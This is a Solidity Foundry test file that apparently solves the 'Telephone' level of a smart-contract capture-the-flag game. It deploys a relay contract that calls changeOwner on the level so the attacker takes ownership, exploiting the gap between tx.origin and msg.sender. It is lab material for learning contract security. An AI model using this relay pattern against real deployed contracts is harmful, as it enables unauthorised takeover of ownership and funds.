// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./utils/BaseTest.sol";
import "../src/levels/4-Telephone/Telephone.sol";
import "../src/levels/4-Telephone/TelephoneFactory.sol";

contract TelephoneTest is Test, BaseTest {
    Telephone public level;

    constructor() {
        levelFactory = new TelephoneFactory();
    }

    function setUp() public override {
        super.setUp();
        levelAddr = payable(_createLevelInstance());
        level = Telephone(levelAddr);
    }

    function testAttack() public {
        _attack();
        _validateLevel();
    }

    function _attack() internal override {
        vm.startPrank(attacker);

        // 1. Call changeOwner from attacking contract
        TelephoneAttack telephoneAttack = new TelephoneAttack();
        telephoneAttack.changeOwner(level, attacker);

        vm.stopPrank();
    }
}

contract TelephoneAttack {
    function changeOwner(Telephone level, address _owner) public {
        level.changeOwner(_owner);
    }
}
